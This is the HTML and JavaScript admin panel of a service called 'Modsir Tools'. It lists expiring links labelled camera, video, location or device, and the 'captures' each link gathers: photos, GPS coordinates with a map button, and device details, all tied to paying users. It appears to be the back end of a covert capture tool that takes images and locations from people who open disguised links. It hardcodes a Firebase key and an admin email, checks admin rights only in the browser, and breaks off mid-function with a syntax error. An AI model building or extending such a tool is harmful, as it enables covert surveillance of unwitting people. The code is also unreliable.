<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Admin Panel - Modsir Tools</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
<style>
  :root{--bg:#05070f;--accent:#22d3ee;--accent-2:#a855f7;--accent-3:#10b981;--gold:#fbbf24;--danger:#ef4444;--text:#fff;--text-dim:rgba(255,255,255,0.6);--glass:rgba(255,255,255,0.04);--glass-2:rgba(255,255,255,0.08);--border:rgba(255,255,255,0.08);--border-2:rgba(255,255,255,0.15);}
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
  body{font-family:'Plus Jakarta Sans',-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;position:relative;}
  body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 20% 0%,rgba(251,191,36,0.2) 0%,transparent 50%),radial-gradient(ellipse at 80% 100%,rgba(168,85,247,0.3) 0%,transparent 50%);z-index:-2;}
  .container{max-width:1100px;margin:0 auto;padding:20px 18px 40px;}
  .hidden{display:none !important;}
  .navbar{position:sticky;top:0;z-index:100;background:rgba(5,7,15,0.85);backdrop-filter:blur(24px);border-bottom:1px solid rgba(251,191,36,0.3);padding:14px 18px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;}
  .brand{display:flex;align-items:center;gap:11px;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:1.05rem;}
  .brand-logo{width:42px;height:42px;border-radius:11px;background:linear-gradient(135deg,var(--gold),#f59e0b);display:flex;align-items:center;justify-content:center;font-size:1.3rem;box-shadow:0 8px 24px rgba(251,191,36,0.4);color:#000;font-weight:800;}
  .brand-text{display:flex;flex-direction:column;line-height:1.1;}
  .brand-text small{font-size:0.6rem;letter-spacing:0.15em;text-transform:uppercase;color:var(--gold);}
  .admin-badge{padding:6px 14px;border-radius:20px;background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;font-weight:700;font-size:0.75rem;}
  .card{background:var(--glass);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:22px;padding:24px;margin-bottom:18px;box-shadow:0 20px 50px rgba(0,0,0,0.4);}
  .card h2{font-family:'Space Grotesk',sans-serif;font-size:1.15rem;margin-bottom:16px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
  .card h2 .count-badge{padding:3px 10px;border-radius:20px;background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;font-size:0.7rem;font-weight:800;}
  button{padding:11px 20px;border-radius:10px;font-weight:600;font-size:0.85rem;cursor:pointer;transition:0.25s;font-family:inherit;border:none;display:inline-flex;align-items:center;justify-content:center;gap:6px;}
  button:active{transform:scale(0.97);}
  button.primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;}
  button.gold{background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;box-shadow:0 6px 20px rgba(251,191,36,0.4);}
  button.success{background:linear-gradient(135deg,var(--accent-3),#059669);color:#fff;}
  button.danger{background:rgba(239,68,68,0.15);color:#fca5a5;border:1px solid rgba(239,68,68,0.35);}
  button.secondary{background:var(--glass-2);color:#fff;border:1px solid var(--border-2);}
  button.small{padding:8px 14px;font-size:0.78rem;}
  input{width:100%;padding:13px 16px;border-radius:12px;border:1px solid var(--border-2);background:rgba(0,0,0,0.3);color:#fff;font-size:0.95rem;outline:none;margin-bottom:14px;font-family:inherit;}
  input:focus{border-color:var(--gold);}
  .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:14px;margin-bottom:18px;}
  .stat-box{background:linear-gradient(160deg,rgba(251,191,36,0.1),rgba(168,85,247,0.05));border:1px solid rgba(251,191,36,0.3);border-radius:16px;padding:20px 14px;text-align:center;}
  .stat-box h3{font-family:'Space Grotesk',sans-serif;font-size:2rem;color:var(--gold);font-weight:800;}
  .stat-box p{font-size:0.72rem;opacity:0.7;text-transform:uppercase;letter-spacing:0.06em;margin-top:4px;}
  .req-item{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:16px;padding:16px;margin-bottom:12px;}
  .req-header{display:flex;justify-content:space-between;align-items:flex-start;gap:12px;margin-bottom:12px;flex-wrap:wrap;}
  .req-info h4{font-family:'Space Grotesk',sans-serif;font-size:1rem;margin-bottom:4px;}
  .req-info p{font-size:0.8rem;opacity:0.7;}
  .req-status{padding:5px 12px;border-radius:20px;font-size:0.7rem;font-weight:700;text-transform:uppercase;}
  .req-status.pending{background:rgba(251,191,36,0.15);color:var(--gold);border:1px solid rgba(251,191,36,0.4);}
  .req-status.approved{background:rgba(16,185,129,0.15);color:var(--accent-3);border:1px solid rgba(16,185,129,0.4);}
  .req-status.rejected{background:rgba(239,68,68,0.15);color:#fca5a5;border:1px solid rgba(239,68,68,0.4);}
  .req-actions{display:flex;gap:8px;flex-wrap:wrap;}
  .user-item{display:flex;align-items:center;gap:14px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:14px;padding:14px;margin-bottom:10px;flex-wrap:wrap;}
  .user-avatar{width:46px;height:46px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-weight:700;color:#000;font-family:'Space Grotesk',sans-serif;font-size:1rem;overflow:hidden;flex-shrink:0;}
  .user-avatar img{width:100%;height:100%;object-fit:cover;}
  .user-info{flex:1;min-width:200px;}
  .user-info h4{font-size:0.95rem;margin-bottom:2px;font-family:'Space Grotesk',sans-serif;}
  .user-info p{font-size:0.75rem;opacity:0.6;}
  .user-plan{padding:4px 10px;border-radius:20px;font-size:0.65rem;font-weight:700;text-transform:uppercase;}
  .user-plan.pro{background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;}
  .user-plan.trial{background:rgba(148,163,184,0.15);color:#cbd5e1;border:1px solid rgba(148,163,184,0.3);}
  .tabs{display:flex;gap:6px;background:rgba(0,0,0,0.4);border-radius:14px;padding:6px;margin-bottom:20px;border:1px solid var(--border);overflow-x:auto;}
  .tab{flex:1;min-width:110px;padding:11px;border-radius:10px;background:transparent;border:none;color:var(--text-dim);font-weight:600;font-size:0.82rem;cursor:pointer;font-family:inherit;white-space:nowrap;}
  .tab.active{background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;}
  .toast{position:fixed;top:80px;right:16px;left:16px;max-width:400px;margin-left:auto;background:linear-gradient(135deg,var(--accent-3),#059669);color:#fff;padding:14px 18px;border-radius:14px;font-weight:600;font-size:0.88rem;box-shadow:0 16px 40px rgba(16,185,129,0.5);opacity:0;transform:translateY(-24px);transition:all 0.4s;z-index:2000;pointer-events:none;}
  .toast.show{opacity:1;transform:translateY(0);}
  .toast.error{background:linear-gradient(135deg,var(--danger),#b91c1c);}
  .empty-state{text-align:center;padding:40px 20px;opacity:0.5;}
  .empty-state .icon{font-size:3rem;margin-bottom:12px;}
  .spinner{width:44px;height:44px;border:4px solid rgba(251,191,36,0.2);border-top-color:var(--gold);border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 16px;}
  @keyframes spin{to{transform:rotate(360deg);}}
  .capture-card{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:14px;overflow:hidden;}
  .capture-card img{width:100%;aspect-ratio:1;object-fit:cover;display:block;cursor:pointer;background:#000;}
  .capture-info{padding:10px 12px;font-size:0.72rem;line-height:1.6;}
  .capture-info .row{display:flex;gap:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;opacity:0.85;}
  .capture-info .web{color:var(--accent);font-weight:600;}
  .capture-info .time{opacity:0.5;font-size:0.66rem;margin-top:4px;}
  .capture-actions{padding:0 10px 10px;display:flex;gap:6px;}
  .capture-actions button{flex:1;padding:6px;font-size:0.68rem;}
  .link-stat-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px;}
  .link-stat{background:rgba(34,211,238,0.08);border:1px solid rgba(34,211,238,0.2);border-radius:10px;padding:8px;text-align:center;}
  .link-stat.green{background:rgba(16,185,129,0.08);border-color:rgba(16,185,129,0.2);}
  .link-stat .num{font-family:'Space Grotesk',sans-serif;font-size:1rem;font-weight:800;}
  .link-stat .lbl{font-size:0.6rem;opacity:0.7;text-transform:uppercase;margin-top:2px;}
  @media (max-width:480px){.container{padding:14px 12px 30px;}.card{padding:18px;}}
</style>
</head>
<body>

<div class="navbar">
  <div class="brand">
    <div class="brand-logo">👑</div>
    <div class="brand-text"><span>Admin Panel</span><small>Modsir Tools</small></div>
  </div>
  <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
    <span class="admin-badge" id="adminEmail">...</span>
    <button class="danger small" onclick="adminLogout()">Logout</button>
  </div>
</div>

<div id="loadingView" class="container" style="text-align:center;padding-top:100px;">
  <div class="spinner"></div>
  <p style="opacity:0.6;">Verifying admin...</p>
</div>

<div id="adminView" class="container hidden">
  <div class="tabs">
    <button class="tab active" onclick="switchTab('overview', this)">📊 Overview</button>
    <button class="tab" onclick="switchTab('requests', this)">📩 Requests <span id="reqCount"></span></button>
    <button class="tab" onclick="switchTab('users', this)">👥 Users</button>
    <button class="tab" onclick="switchTab('links', this)">🔗 Links</button>
    <button class="tab" onclick="switchTab('captures', this)">🖼️ Captures</button>
  </div>

  <div id="tab-overview">
    <div class="stats">
      <div class="stat-box"><h3 id="sUsers">0</h3><p>Total Users</p></div>
      <div class="stat-box"><h3 id="sPro">0</h3><p>Pro Users</p></div>
      <div class="stat-box"><h3 id="sPending">0</h3><p>Pending</p></div>
      <div class="stat-box"><h3 id="sLinks">0</h3><p>Total Links</p></div>
      <div class="stat-box"><h3 id="sCaptures">0</h3><p>Captures</p></div>
    </div>
    <div class="card">
      <h2>🚀 Quick Actions</h2>
      <div style="display:flex;gap:10px;flex-wrap:wrap;">
        <button class="gold small" onclick="location.href='index.html'">🏠 Website</button>
        <button class="secondary small" onclick="location.href='dashboard.html'">📊 Dashboard</button>
        <button class="primary small" onclick="location.reload()">🔄 Refresh</button>
      </div>
    </div>
  </div>

  <div id="tab-requests" class="hidden">
    <div class="card">
      <h2>📩 Full Access Requests <span class="count-badge" id="reqBadge">0</span></h2>
      <div id="requestsList"></div>
    </div>
  </div>

  <div id="tab-users" class="hidden">
    <div class="card">
      <h2>👥 All Users <span class="count-badge" id="userBadge">0</span></h2>
      <input type="search" id="userSearch" placeholder="🔍 Search..." oninput="renderUsers()">
      <div id="usersList"></div>
    </div>
  </div>

  <div id="tab-links" class="hidden">
    <div class="card">
      <h2>🔗 All Links <span class="count-badge" id="linkBadge">0</span></h2>
      <input type="search" id="linkSearch" placeholder="🔍 Search links..." oninput="renderAllLinks()">
      <div id="linksList" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;"></div>
    </div>
  </div>

  <div id="tab-captures" class="hidden">
    <div class="card">
      <h2>🖼️ All Captures <span class="count-badge" id="captureBadge">0</span></h2>
      <input type="search" id="captureSearch" placeholder="🔍 Search..." oninput="renderAllCaptures()">
      <div id="capturesList" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px;"></div>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getAuth, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
import { getFirestore, collection, doc, updateDoc, deleteDoc, onSnapshot, getDoc, Timestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyBW17Z4J5ru9EbpiEfygz_Dpj8ekJuKqBg",
  authDomain: "decision-b42a6.firebaseapp.com",
  projectId: "decision-b42a6",
  storageBucket: "decision-b42a6.firebasestorage.app",
  messagingSenderId: "108149086619",
  appId: "1:108149086619:web:63f17a58695f1d7a1e293e"
};

const ADMIN_EMAIL = "malikmudasirkhar001@gmail.com";

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

let allUsers = [];
let allRequests = [];
let allLinks = [];
let allCaptures = [];
let unsubUsers = null;
let unsubRequests = null;
let unsubLinks = null;
let unsubCaptures = null;

window.showToast = function(msg, isError = false) {
  const t = document.getElementById("toast");
  t.textContent = msg;
  t.className = "toast show" + (isError ? " error" : "");
  clearTimeout(t._to);
  t._to = setTimeout(() => t.className = "toast", 3500);
}

onAuthStateChanged(auth, async (user) => {
  if (!user) {
    setTimeout(() => {
      if (!auth.currentUser) location.href = "index.html";
    }, 1500);
    return;
  }
  if (user.email !== ADMIN_EMAIL) {
    showToast("Not admin", true);
    setTimeout(() => location.href = "dashboard.html", 800);
    return;
  }

  document.getElementById("adminEmail").textContent = user.email.split("@")[0];
  document.getElementById("loadingView").classList.add("hidden");
  document.getElementById("adminView").classList.remove("hidden");
  await startListeners();
});

async function startListeners() {
  unsubUsers = onSnapshot(collection(db, "users"), (snap) => {
    allUsers = snap.docs.map(d => ({ id: d.id, ...d.data() }));
    renderUsers(); updateStats();
  }, err => console.error(err));

  unsubRequests = onSnapshot(collection(db, "requests"), (snap) => {
    allRequests = snap.docs.map(d => ({ id: d.id, ...d.data() }));
    allRequests.sort((a,b) => (b.createdAt?.seconds||0) - (a.createdAt?.seconds||0));
    renderRequests(); updateStats();
  }, err => console.error(err));

  unsubLinks = onSnapshot(collection(db, "links"), (snap) => {
    allLinks = snap.docs.map(d => ({ id: d.id, ...d.data() }));
    allLinks.sort((a,b) => (b.createdAt?.seconds||0) - (a.createdAt?.seconds||0));
    renderAllLinks();
    renderAllCaptures();
    updateStats();
  }, err => console.error(err));

  unsubCaptures = onSnapshot(collection(db, "captures"), (snap) => {
    allCaptures = snap.docs.map(d => ({ id: d.id, ...d.data() }));
    allCaptures.sort((a,b) => (b.timestamp?.seconds||0) - (a.timestamp?.seconds||0));
    renderAllCaptures(); updateStats();
  }, err => console.error(err));
}

function updateStats() {
  document.getElementById("sUsers").textContent = allUsers.length;
  document.getElementById("sPro").textContent = allUsers.filter(u => u.plan === "pro").length;
  document.getElementById("sPending").textContent = allRequests.filter(r => r.status === "pending").length;
  document.getElementById("sLinks").textContent = allLinks.length;
  document.getElementById("sCaptures").textContent = allCaptures.length;
  const pending = allRequests.filter(r => r.status === "pending").length;
  document.getElementById("reqCount").textContent = pending > 0 ? `(${pending})` : "";
  document.getElementById("reqBadge").textContent = allRequests.length;
  document.getElementById("userBadge").textContent = allUsers.length;
  document.getElementById("linkBadge").textContent = allLinks.length;
  document.getElementById("captureBadge").textContent = allCaptures.length;
}

window.switchTab = function(tab, el) {
  document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
  el.classList.add("active");
  ["overview","requests","users","links","captures"].forEach(t => {
    document.getElementById("tab-" + t).classList.add("hidden");
  });
  document.getElementById("tab-" + tab).classList.remove("hidden");
}

/* REQUESTS */
function renderRequests() {
  const list = document.getElementById("requestsList");
  if (allRequests.length === 0) {
    list.innerHTML = `<div class="empty-state"><div class="icon">📭</div><p>No requests</p></div>`;
    return;
  }
  list.innerHTML = allRequests.map(r => {
    const status = r.status || "pending";
    const statusLabel = status === "pending" ? "⏳ Pending" : status === "approved" ? "✅ Approved" : "❌ Rejected";
    const time = r.createdAt?.seconds ? new Date(r.createdAt.seconds*1000).toLocaleString() : "-";
    let actions = "";
    if (status === "pending") {
      actions = `<button class="success small" onclick="approveRequest('${r.id}', '${r.userId}')">✅ Approve</button><button class="danger small" onclick="rejectRequest('${r.id}')">❌ Reject</button>`;
    } else if (status === "approved") {
      actions = `<button class="danger small" onclick="rejectRequest('${r.id}')">Revoke</button>`;
    } else {
      actions = `<button class="success small" onclick="approveRequest('${r.id}', '${r.userId}')">Approve</button>`;
    }
    return `
      <div class="req-item">
        <div class="req-header">
          <div class="req-info">
            <h4>${escapeHtml(r.userName || "User")}</h4>
            <p>${escapeHtml(r.userEmail || "")}</p>
            <p style="font-size:0.72rem;opacity:0.5;margin-top:4px;">🕒 ${time}</p>
          </div>
          <span class="req-status ${status}">${statusLabel}</span>
        </div>
        ${r.message ? `<p style="font-size:0.82rem;opacity:0.7;margin-bottom:12px;">"${escapeHtml(r.message)}"</p>` : ""}
        <div class="req-actions">${actions}</div>
      </div>`;
  }).join("");
}

window.approveRequest = async function(reqId, userId) {
  if (!confirm("Approve?")) return;
  try {
    await updateDoc(doc(db, "requests", reqId), { status: "approved", approvedAt: new Date() });
    await updateDoc(doc(db, "users", userId), { plan: "pro" });
    showToast("✅ Approved!");
  } catch (e) { showToast("Fail: " + e.message, true); }
}

window.rejectRequest = async function(reqId) {
  if (!confirm("Reject?")) return;
  try {
    await updateDoc(doc(db, "requests", reqId), { status: "rejected" });
    showToast("Rejected");
  } catch (e) { showToast("Fail", true); }
}

/* USERS */
function renderUsers() {
  const list = document.getElementById("usersList");
  const search = (document.getElementById("userSearch")?.value || "").toLowerCase();
  let filtered = allUsers;
  if (search) filtered = filtered.filter(u => (u.name||"").toLowerCase().includes(search) || (u.email||"").toLowerCase().includes(search));
  if (filtered.length === 0) {
    list.innerHTML = `<div class="empty-state"><div class="icon">👥</div><p>No users</p></div>`;
    return;
  }
  list.innerHTML = filtered.map(u => {
    const initials = (u.name || u.email || "U")[0].toUpperCase();
    const plan = u.plan || "trial";
    const photoURL = u.photoURL;
    return `
      <div class="user-item">
        <div class="user-avatar">${photoURL ? `<img src="${photoURL}">` : initials}</div>
        <div class="user-info">
          <h4>${escapeHtml(u.name || "Unknown")}</h4>
          <p>${escapeHtml(u.email || "")}</p>
        </div>
        <span class="user-plan ${plan}">${plan}</span>
        <div style="display:flex;gap:6px;flex-wrap:wrap;">
          ${plan === "trial" ? `<button class="success small" onclick="makePro('${u.id}')">Make Pro</button>` : `<button class="danger small" onclick="makeTrial('${u.id}')">Demote</button>`}
        </div>
      </div>`;
  }).join("");
}

window.makePro = async function(userId) {
  if (!confirm("Make Pro?")) return;
  try { await updateDoc(doc(db, "users", userId), { plan: "pro" }); showToast("Pro 👑"); }
  catch (e) { showToast("Fail", true); }
}

window.makeTrial = async function(userId) {
  if (!confirm("Demote?")) return;
  try { await updateDoc(doc(db, "users", userId), { plan: "trial", linksUsed: 0 }); showToast("Trial"); }
  catch (e) { showToast("Fail", true); }
}

/* LINKS */
function renderAllLinks() {
  const list = document.getElementById("linksList");
  if (!list) return;
  const search = (document.getElementById("linkSearch")?.value || "").toLowerCase();
  let filtered = allLinks;
  if (search) filtered = filtered.filter(l => JSON.stringify(l).toLowerCase().includes(search));

  if (filtered.length === 0) {
    list.innerHTML = `<div class="empty-state" style="grid-column:1/-1;"><div class="icon">🔗</div><p>No links</p></div>`;
    return;
  }

  list.innerHTML = filtered.map(link => {
    const now = Date.now();
    const expMs = link.expiresAt?.seconds ? link.expiresAt.seconds * 1000 : 0;
    const isExpired = expMs < now;
    const owner = allUsers.find(u => u.id === link.ownerId);
    const ownerName = owner?.name || owner?.email?.split("@")[0] || "Unknown";
    const featureIcons = { camera: "📷", video: "🎥", location: "📍", device: "📱", all: "⚡" };
    const icon = featureIcons[link.feature] || "🔗";
    const views = link.views || 0;
    const captures = link.captureCount || 0;
    const website = link.website || "Modsir Tools";
    const createdAt = link.createdAt?.seconds ? new Date(link.createdAt.seconds*1000).toLocaleString() : "-";

    let timeLeft = "";
    if (isExpired) timeLeft = "EXPIRED";
    else {
      const diff = expMs - now;
      const h = Math.floor(diff / (1000*60*60));
      const m = Math.floor((diff % (1000*60*60)) / (1000*60));
      timeLeft = h > 0 ? `${h}h ${m}m left` : `${m}m left`;
    }

    return `
      <div class="capture-card" style="border-color:${isExpired ? 'rgba(239,68,68,0.3)' : 'rgba(34,211,238,0.3)'};">
        <div style="padding:14px;">
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
            <div style="width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,rgba(34,211,238,0.15),rgba(168,85,247,0.15));border:1px solid rgba(34,211,238,0.3);display:flex;align-items:center;justify-content:center;font-size:1.2rem;">${icon}</div>
            <div style="flex:1;min-width:0;">
              <div style="font-family:'Space Grotesk',sans-serif;font-size:0.8rem;font-weight:700;word-break:break-all;">${link.id}</div>
              <div style="font-size:0.65rem;opacity:0.6;margin-top:2px;">👤 ${escapeHtml(ownerName)}</div>
            </div>
          </div>
          <div style="font-size:0.68rem;opacity:0.7;margin-bottom:10px;">🌐 ${escapeHtml(website)}</div>
          <div class="link-stat-row">
            <div class="link-stat"><div class="num" style="color:var(--accent);">${views}</div><div class="lbl">👁️ Views</div></div>
            <div class="link-stat green"><div class="num" style="color:var(--accent-3);">${captures}</div><div class="lbl">📸 Data</div></div>
          </div>
          <div style="text-align:center;font-size:0.7rem;font-weight:700;color:${isExpired ? 'var(--danger)' : 'var(--gold)'};margin-bottom:10px;">${timeLeft}</div>
          <div style="display:flex;gap:6px;">
            <button class="success small" style="flex:1;" onclick="extendLink('${link.id}')">⏰ Extend</button>
            <button class="danger small" style="flex:1;" onclick="deleteLink('${link.id}')">🗑️ Delete</button>
          </div>
          <div style="font-size:0.6rem;opacity:0.4;text-align:center;margin-top:8px;">${createdAt}</div>
        </div>
      </div>
    `;
  }).join("");
}

window.extendLink = async function(linkId) {
  const choice = prompt(
    "⏰ Kitna waqt badhana hai?\n\n" +
    "1 → 1 ghanta\n" +
    "2 → 6 ghante\n" +
    "3 → 24 ghante\n" +
    "4 → 7 din\n" +
    "5 → Custom (minutes)\n\n" +
    "Number likho:"
  );

  let minutes = 0;
  if (choice === "1") minutes = 60;
  else if (choice === "2") minutes = 360;
  else if (choice === "3") minutes = 1440;
  else if (choice === "4") minutes = 10080;
  else if (choice === "5") {
    const c = prompt("Kitne minutes?");
    minutes = parseInt(c);
    if (!minutes || minutes <= 0) return;
  } else return;

  try {
    const linkSnap = await getDoc(doc(db, "links", linkId));
    if (!linkSnap.exists()) { showToast("Link not found", true); return; }
    const linkData = linkSnap.data();
    let currentExpiry = linkData.expiresAt?.seconds ? linkData.expiresAt.seconds * 1000 : Date.now();
    if (currentExpiry < Date.now()) currentExpiry = Date.now();
    const newExpiry = new Date(currentExpiry + minutes * 60 * 1000);

    await updateDoc(doc(db, "links", linkId), { expiresAt: Timestamp.fromDate(newExpiry) });
    showToast(`✅ Link ${minutes} min extend!`);
  } catch (e) { showToast("Fail: " + e.message, true); }
}

window.deleteLink = async function(linkId) {
  if (!confirm("Delete this link?")) return;
  try { await deleteDoc(doc(db, "links", linkId)); showToast("Deleted 🗑️"); }
  catch (e) { showToast("Fail", true); }
}

/* CAPTURES */
function renderAllCaptures() {
  const list = document.getElementById("capturesList");
  if (!list) return;
  const search = (document.getElementById("captureSearch")?.value || "").toLowerCase();
  let filtered = allCaptures;
  if (search) filtered = filtered.filter(c => JSON.stringify(c).toLowerCase().includes(search));

  if (filtered.length === 0) {
    list.innerHTML = `<div class="empty-state" style="grid-column:1/-1;"><div class="icon">🖼️</div><p>No captures</p></div>`;
    return;
  }

  list.innerHTML = filtered.map(c => {
    let thumb = "";
    if (c.photo) thumb = `<img src="${c.photo}" onclick="viewCapture('${c.id}')" loading="lazy">`;
    else if (c.type === "location") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(34,211,238,0.1);">📍</div>`;
    else if (c.type === "device") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(168,85,247,0.1);">📱</div>`;
    else if (c.type === "video") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(239,68,68,0.1);">🎥</div>`;
    else thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;">📎</div>`;

    const owner = allUsers.find(u => u.id === c.ownerId);
    const ownerName = owner?.name || owner?.email?.split("@")[0] || "Unknown";
    const time = c.timestamp?.seconds ? new Date(c.timestamp.seconds*1000).toLocaleString() : "-";
    const website = c.website || "Modsir Tools";

    const link = allLinks.find(l => l.id === c.linkId);
    const views = link?.views || 0;

    return `
      <div class="capture-card">
        ${thumb}
        <div class="capture-info">
          <div class="row">👤 ${escapeHtml(ownerName)}</div>
          <div class="row">🏷️ ${c.type || c.feature}</div>
          <div class="row web">🌐 ${escapeHtml(website)}</div>
          <div class="row" style="font-size:0.65rem;opacity:0.65;">👁️ ${views} views</div>
          ${c.location ? `<div class="row" style="font-size:0.65rem;opacity:0.6;">📍 ${c.location.lat?.toFixed(2)}, ${c.location.lon?.toFixed(2)}</div>` : ""}
          <div class="time">🕒 ${time}</div>
        </div>
        <div class="capture-actions">
          ${c.location ? `<button class="secondary small" onclick="openMap(${c.location.lat},${c.location.lon})">🗺️</button>` : ""}
          ${c.device ? `<button class="secondary small" onclick="viewDeviceInfo('${c.id}')">📱</button>` : ""}
          <button class="danger small" onclick="deleteCapture('${c.id}')">🗑️</button>
        </div>
      </div>`;
  }).join("");
}

window.viewCapture = function(id) {
  const c = allCaptures.find(x => x.id === id);
  if (!c) return;
  const w = window.open("");
  if (c.photo) w.document.write(`<html><body style="margin:0;background:#000;display:flex;align-items:center;justify-content:center;min-height:100vh;"><img src="${c.photo}" style="max-width:100%;max-height:100vh;"></body></html>`);
  else w.document.write(`<html><body style="background:#0a0a1a;color:#fff;padding:20px;font-family:monospace;"><pre>${JSON.stringify(c, null, 2)}</pre></body></html>`);
}

window.deleteCapture = async function(id) {
  if (!confirm("Delete?")) return;
  try { await deleteDoc(doc(db, "captures", id)); showToast("Deleted 🗑️"); }

window.adminLogout = async function() {
  if (unsubUsers) unsubUsers();
  if (unsubRequests) unsubRequests();
  if (unsubLinks) unsubLinks();
  if (unsubCaptures) unsubCaptures();
  await signOut(auth);
  location.href = "index.html";
}

function escapeHtml(s) {
  if (s == null) return "";
  return String(s).replace(/[&<>"']/g, m => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;" }[m]));
}
